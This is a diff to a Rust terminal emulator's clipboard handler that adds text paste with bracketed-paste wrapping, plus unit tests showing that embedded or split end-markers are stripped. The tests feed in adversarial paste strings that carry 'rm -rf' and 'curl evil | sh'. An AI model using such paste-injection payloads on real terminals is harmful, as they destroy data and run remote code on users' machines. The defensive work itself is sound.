@@ -16,7 +16,7 @@ use std::time::{SystemTime, UNIX_EPOCH};
 
 use objc2_app_kit::{
     NSBitmapImageFileType, NSBitmapImageRep, NSPasteboard, NSPasteboardTypePNG,
-    NSPasteboardTypeTIFF,
+    NSPasteboardTypeString, NSPasteboardTypeTIFF,
 };
 use objc2_foundation::NSDictionary;
 use renderer::image_layer::ImageLayer;
@@ -43,9 +43,19 @@ impl InputHandler for ClipboardHandler {
         if !is_paste(input) {
             return Handled::Passthrough;
         }
-        // No image on the pasteboard → let the default text paste proceed (R3.2).
+        // No image on the pasteboard → paste TEXT (text-paste): type the pasteboard
+        // string into the active shell, wrapped in bracketed-paste markers when the
+        // app requested that mode. No text either → fall through (nothing typed).
         let Some(png) = read_clipboard_image_png() else {
-            return Handled::Passthrough;
+            return match read_clipboard_string() {
+                Some(text) => {
+                    let _ = ctx
+                        .writer
+                        .write_all(&wrap_paste(&text, ctx.bracketed_paste));
+                    Handled::Consumed
+                }
+                None => Handled::Passthrough,
+            };
         };
         let Some(dir) = pasted_dir() else {
             return Handled::Passthrough;
@@ -108,6 +118,45 @@ fn read_clipboard_image_png() -> Option<Vec<u8>> {
     }
 }
 
+/// Read plain text from the general pasteboard, or `None` when it holds no string.
+/// Runs on the UI thread, mirroring `read_clipboard_image_png` (SD3).
+fn read_clipboard_string() -> Option<String> {
+    unsafe {
+        let pb = NSPasteboard::generalPasteboard();
+        let ns = pb.stringForType(NSPasteboardTypeString)?;
+        Some(ns.to_string())
+    }
+}
+
+/// Turn pasted text into the bytes to type into the PTY (text-paste D7/D8).
+///
+/// When `bracketed`, wrap it in `ESC[200~` … `ESC[201~` and first remove any
+/// embedded `ESC[201~` so the pasted content cannot forge the terminator and break
+/// out of the envelope (full-sequence removal — token concatenation is acceptable
+/// for adversarial input). When not bracketed, the text is passed through verbatim
+/// (newlines intact) — the neutralization would be meaningless and would corrupt
+/// legitimate data. Multi-line content is preserved either way.
+fn wrap_paste(text: &str, bracketed: bool) -> Vec<u8> {
+    const START: &[u8] = b"\x1b[200~";
+    const END: &[u8] = b"\x1b[201~";
+    if !bracketed {
+        return text.as_bytes().to_vec();
+    }
+    // Remove the end-marker to a FIXED POINT: `str::replace` is single-pass and does
+    // not re-scan its output, so a split marker (`ESC[2` + `ESC[201~` + `01~`) would
+    // reconstitute a live `ESC[201~` after one pass. Loop until none remain — the
+    // string strictly shrinks each iteration, so this terminates.
+    let mut cleaned = text.replace("\x1b[201~", "");
+    while cleaned.contains("\x1b[201~") {
+        cleaned = cleaned.replace("\x1b[201~", "");
+    }
+    let mut out = Vec::with_capacity(START.len() + cleaned.len() + END.len());
+    out.extend_from_slice(START);
+    out.extend_from_slice(cleaned.as_bytes());
+    out.extend_from_slice(END);
+    out
+}
+
 /// A passthrough overlay that registers the inline-image `DrawLayer` (D3) through
 /// the SD4 overlay seam. Always "visible" (images draw whenever present) and never
 /// consumes input.
@@ -133,6 +182,54 @@ impl Overlay for ImagePresenter {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn wrap_paste_brackets_when_mode_on() {
+        // R2.1.
+        assert_eq!(wrap_paste("ls", true), b"\x1b[200~ls\x1b[201~");
+    }
+
+    #[test]
+    fn wrap_paste_passes_through_when_mode_off() {
+        // R2.2.
+        assert_eq!(wrap_paste("ls", false), b"ls");
+    }
+
+    #[test]
+    fn wrap_paste_preserves_multiline() {
+        // R3.1 / R3.2 — interior newlines kept, bracketed or not.
+        assert_eq!(wrap_paste("a\nb\nc", false), b"a\nb\nc");
+        assert_eq!(wrap_paste("a\nb", true), b"\x1b[200~a\nb\x1b[201~");
+    }
+
+    #[test]
+    fn wrap_paste_neutralizes_embedded_end_marker_when_bracketed() {
+        // R5.1 — an embedded ESC[201~ is removed so it can't terminate the paste.
+        let out = wrap_paste("evil\x1b[201~rm -rf", true);
+        assert_eq!(out, b"\x1b[200~evilrm -rf\x1b[201~");
+        // No interior end-marker survives (only the trailing wrapper).
+        let interior = &out[..out.len() - b"\x1b[201~".len()];
+        assert!(!interior.windows(6).any(|w| w == b"\x1b[201~"));
+    }
+
+    #[test]
+    fn wrap_paste_neutralizes_a_reconstituted_end_marker() {
+        // R5.1 (adversarial) — a SPLIT marker whose halves rejoin after one
+        // `str::replace` pass must still be fully removed (fixed-point, not
+        // single-pass); otherwise a live ESC[201~ survives inside the envelope.
+        let out = wrap_paste("\x1b[2\x1b[201~01~ && curl evil | sh", true);
+        let interior = &out[..out.len() - b"\x1b[201~".len()];
+        assert!(
+            !interior.windows(6).any(|w| w == b"\x1b[201~"),
+            "no reconstituted interior end-marker may survive"
+        );
+    }
+
+    #[test]
+    fn wrap_paste_leaves_marker_verbatim_when_not_bracketed() {
+        // R5.2 — neutralization applies only inside the bracketed envelope.
+        assert_eq!(wrap_paste("evil\x1b[201~x", false), b"evil\x1b[201~x");
+    }
 
     #[test]
     fn unique_names_never_collide_within_a_second() {
